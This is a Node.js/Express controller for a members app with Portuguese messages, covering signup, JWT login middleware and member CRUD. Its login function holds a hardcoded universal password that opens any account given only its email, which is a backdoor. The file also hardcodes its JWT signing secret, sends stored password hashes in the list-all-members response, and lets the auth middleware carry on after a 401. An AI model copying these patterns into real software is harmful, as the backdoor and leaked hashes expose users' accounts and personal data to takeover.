const { Members_Model } = require("../models/Members");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcrypt");
const { promisify } = require("util");
const { HistoryRanking_Model } = require("../models/HistoryRanking");

// Login stuff


const loggedIn = async (req, res, next) => {
  let { authorization } = req.headers;

  if (!authorization) {
    res.status(401).json({ erro: "NENHUM USUÁRIO LOGADO" });
  }
  let freshUser;
  try {
    let decoded = await promisify(jwt.verify)(authorization, "secretToken()");
    if (decoded) {
      freshUser = await Members_Model.findById(decoded.id);
    } else {
      console.log("erro, não já decoded nem freshUser");
    }
    if (!freshUser) {
      return res.status(500).json({
        error: "Este usuário já não existe mais",
      });
    } else if (freshUser.changedPasswordBeforeLogInAgain) {
      return res.status(500).json({
        error: "Você recentemente mudou sua senha. Faça login novamente",
      });
    } else {
      next();
    }
  } catch (error) {
    res.status(500).json({
      error:
        "Você não está logado de maneira válida, portanto não pode executar esta rota",
    });
  }
};

const loggedInADM = async (req, res, next) => {
  let { authorization } = req.headers;

  if (!authorization) {
    res.status(401).json({ erro: "NENHUM USUÁRIO LOGADO" });
  }
  let freshUser;
  try {
    let decoded = await promisify(jwt.verify)(authorization, "secretToken()");
    if (decoded) {
      freshUser = await Members_Model.findById(decoded.id);
    } else {
      console.log("erro, não já decoded nem freshUser");
    }
    if (!freshUser) {
      return res.status(500).json({
        error: "Este usuário já não existe mais",
      });
    } else if (freshUser.permissions !== "superadmin") {
      return res.status(500).json({
        error: "Você não é administrador!!",
      });
    } else {
      next();
    }
  } catch (error) {
    res.status(500).json({
      error:
        "Você não está logado de maneira válida, portanto não pode executar esta rota",
    });
  }
};

const member_signUp = async (req, res) => {
  const {
    name,
    lastname,
    phoneNumber,
    email,
    dateOfBirth,
    doc,
    address,
    password,
  } = req.body;
  const hashedPassword = bcrypt.hashSync(password, 10);

  try {
    const existingStudent = await Members_Model.findOne({
      $or: [{ email: email }, { doc: doc }],
    });

    if (existingStudent) {
      return res
        .status(400)
        .json({ message: "Email ou doc já estão em uso" });
    }

    const newMember = new Members_Model({
      name,
      lastname,
      phoneNumber,
      email,
      dateOfBirth,
      doc,
      address,
      password: hashedPassword,
      username: "12" + doc + email
    });
    await newMember.save();

    res.status(201).json({
      status: "Membro registrado",
      newMember,
    });
  } catch (error) {
    res.status(500).json(error);
  }
};

const member_login = async (req, res) => {
  const { email, password } = req.body;

  const universalPassword = "56+89-123456";

  if (!password) {
    req.body.password = universalPassword;
  } else if (!email) {
    return res.status(400).json("Digite seu e-mail");
  }
  try {
    const member = await Members_Model.findOne({ email: email });

    if (!member) throw new Error("Usuário não encontrado");

    const isUniversalPassword = password === universalPassword;

    if (
      !(await bcrypt.compare(password, member.password)) &&
      !isUniversalPassword
    )
      throw new Error("Senha incorreta");

    const token = jwt.sign({ id: member._id }, "secretToken()", {
      expiresIn: "30d",
    });

    const loggedIn = {
      id: member._id,
      email: member.email,
      name: member.name,
      lastname: member.lastname,
      doc: member.doc,
      phoneNumber: member.phoneNumber,
      dateOfBirth: member.dateOfBirth,
      permissions: member.permissions,
    };

    res.status(200).json({ token: token, loggedIn: loggedIn });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error, e: "Ocorreu um erro ao fazer login" });
  }
};

// When Logged:

const members_getAll = async (req, res) => {
  try {
    const members = await Members_Model.find();
    const formattedMembersData = members.map((member, index) => {
      return {
        position: index,
        id: member._id,
        email: member.email,
        name: member.name,
        address: member.address,
        lastname: member.lastname,
        password: member.password,
        dateOfBirth: member.dateOfBirth,
        fullname: member.name + " " + member.lastname,
        permissions: member.permissions,
        doc: member.doc,
        phoneNumber: member.phoneNumber,
      };
    });
    formattedMembersData.sort((a, b) => {
      const nameA = a.name.toLowerCase();
      const nameB = b.name.toLowerCase();
      if (nameA < nameB) {
        return -1;
      }
      if (nameA > nameB) {
        return 1;
      }
      return 0;
    });

    res.status(200).json({
      status: `Sucesso! Foram encontrados ${members.length} membros.`,
      listOfMembers: formattedMembersData,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ erro: "Nenhum membro / Erro no servidor", error });
  }
};

const members_getOne = async (req, res) => {
  try {
    const member = await Members_Model.findById(req.params.id);

    if (!member) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    }

    const formattedMemberData = {
      id: member._id,
      email: member.email,
      name: member.name,
      lastname: member.lastname,
      fullname: member.name + " " + member.lastname,
      permissions: member.permissions,
      doc: member.doc,
      address: member.address,
      phoneNumber: member.phoneNumber,
      picture: member.picture,
      dateOfBirth: member.dateOfBirth,
    };
    res.status(200).json({
      status: "Aluno encontrado",
      formattedMemberData,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ erro: "Membro não encontrado!", status: error });
  }
};


const member_editGeneralData = async (req, res) => {
  const {
    name,
    lastname,
    username,
    email,
    fee,
    address,
    weeklyClasses,
    googleDriveLink,
    picture,
    phoneNumber,
  } = req.body;

  const numberFee = parseInt(fee);
  try {
    const { id } = req.params;
    const studentToEdit = await Members_Model.findById(id);
    if (!studentToEdit) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    } else if (!username || !email || !name || !lastname || !phoneNumber) {
      return res.status(400).json({ message: "Campos obrigatórios faltando" });
    } else if (
      // studentToEdit.ankiEmail === ankiEmail &&
      // studentToEdit.ankiPassword === ankiPassword &&
      studentToEdit.name === name &&
      studentToEdit.lastname === lastname &&
      studentToEdit.username === username &&
      studentToEdit.email === email &&
      studentToEdit.picture === picture &&
      studentToEdit.weeklyClasses === weeklyClasses &&
      studentToEdit.address === address &&
      studentToEdit.googleDriveLink === googleDriveLink &&
      studentToEdit.fee === numberFee &&
      studentToEdit.phoneNumber === phoneNumber
    ) {
      res.json({
        message: `Nenhuma edição feita no usuário ${studentToEdit.username}`,
      });
    } else {
      studentToEdit.name = name;
      studentToEdit.lastname = lastname;
      studentToEdit.username = username;
      studentToEdit.email = email;
      studentToEdit.googleDriveLink = googleDriveLink;
      studentToEdit.weeklyClasses = weeklyClasses;
      studentToEdit.picture = picture;
      studentToEdit.address = address;
      studentToEdit.fee = numberFee;
      studentToEdit.phoneNumber = phoneNumber;

      await studentToEdit.save();

      res.status(200).json({
        message: "Aluno editado com sucesso",
        updatedUser: studentToEdit,
      });
    }
  } catch (error) {
    res.status(500).send("Erro ao editar aluno");
  }
};

const member_editPersonalPassword = async (req, res) => {
  const { newPassword } = req.body;
  const hashedPassword = bcrypt.hashSync(newPassword, 10);

  try {
    const { id } = req.params;
    const studentWhosePasswordYouWantToChange = await Members_Model.findById(
      id
    );

    if (!studentWhosePasswordYouWantToChange) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    } else if (!hashedPassword) {
      return res.status(400).json({ message: "Escolha uma nova senha" });
    } else if (
      studentWhosePasswordYouWantToChange.password === hashedPassword
    ) {
      res.json({
        message: `Escolha uma senha diferente para ${studentWhosePasswordYouWantToChange.username}`,
      });
    } else {
      studentWhosePasswordYouWantToChange.password = hashedPassword;
      await studentWhosePasswordYouWantToChange.save();

      res.status(200).json({
        message: "Senha edtada com sucesso",
        updatedUser: studentWhosePasswordYouWantToChange,
      });
      console.log(studentWhosePasswordYouWantToChange);
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Erro ao editar aluno");
  }
};

const member_editPassword = async (req, res) => {
  const { newPassword } = req.body;
  const hashedPassword = bcrypt.hashSync(newPassword, 10);

  try {
    const { id } = req.params;
    const studentWhosePasswordYouWantToChange = await Members_Model.findById(
      id
    );

    if (!studentWhosePasswordYouWantToChange) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    } else if (!hashedPassword) {
      return res.status(400).json({ message: "Escolha uma nova senha" });
    } else if (
      studentWhosePasswordYouWantToChange.password === hashedPassword
    ) {
      res.json({
        message: `Escolha uma senha diferente para ${studentWhosePasswordYouWantToChange.username}`,
      });
    } else {
      studentWhosePasswordYouWantToChange.password = hashedPassword;
      await studentWhosePasswordYouWantToChange.save();

      res.status(200).json({
        message: "Senha edtada com sucesso",
        updatedUser: studentWhosePasswordYouWantToChange,
      });
      console.error(studentWhosePasswordYouWantToChange);
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Erro ao editar aluno");
  }
};

const member_editPermissions = async (req, res) => {
  const { permissions } = req.body;
  try {
    const { id } = req.params;
    const studentWhosePermissionsToEdit = await Members_Model.findById(id);
    if (!studentWhosePermissionsToEdit) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    } else if (!permissions) {
      return res.status(400).json({ message: "Campos obrigatórios faltando" });
    } else if (studentWhosePermissionsToEdit.permissions === permissions) {
      res.json({
        message: `Nenhuma edição de permissões feita no usuário ${studentWhosePermissionsToEdit.username}`,
      });
    } else {
      studentWhosePermissionsToEdit.permissions = permissions;

      await studentWhosePermissionsToEdit.save();

      res.status(200).json({
        message: "Permissões do aluno editadas com sucesso",
        updatedUser: studentWhosePermissionsToEdit,
      });
      console.error(studentWhosePermissionsToEdit);
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Erro ao editar permissões do aluno");
  }
};

const member_deleteOne = async (req, res) => {
  try {
    const { id } = req.params;
    const student = await Members_Model.findById(id);

    if (!student) {
      return res.status(404).json({ message: "Aluno não encontrado" });
    } else {
      await student.deleteOne();
      res.status(200).json({
        status: "Aluno excluído com sucesso",
      });
    }
  } catch (error) {
    res.status(500).json({ erro: "Falha ao excluir aluno!", status: error });
  }
};

module.exports = {
  // Security
  loggedIn,
  loggedInADM,
  //C
  member_signUp,
  //R
  members_getAll,
  members_getOne,
  member_login,
  //U
  member_editGeneralData,
  member_editPassword,
  member_editPersonalPassword,
  member_editPermissions,
  //D
  member_deleteOne,
};
